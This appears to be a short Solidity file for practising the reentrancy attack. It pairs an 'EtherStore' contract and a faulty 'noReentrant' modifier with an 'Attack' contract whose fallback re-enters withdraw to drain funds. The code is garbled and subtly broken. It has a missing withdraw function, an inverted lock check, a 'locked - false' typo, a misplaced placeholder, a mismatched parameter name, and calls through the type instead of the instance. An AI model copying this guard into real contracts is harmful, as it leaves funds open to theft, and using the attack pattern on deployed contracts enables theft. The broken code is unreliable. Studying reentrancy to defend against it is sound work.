//SPDX-License-Identifier: MIt
pragma solidity >=0.7.0 <0.9.0;


contract EtherStore {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    bool internal locked;

    modifier noReentrant() {
        require(locked, "No, re-entracy");
        locked = true;

        locked - false;
        _;
    }
}

contract Attack {
    EtherStore public etherStore;
    
    constructor(address _etherStoreAddres) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(EtherStore).balance >= 1 ether) {
            EtherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        EtherStore.deposit{value: 1 ether}();
        EtherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
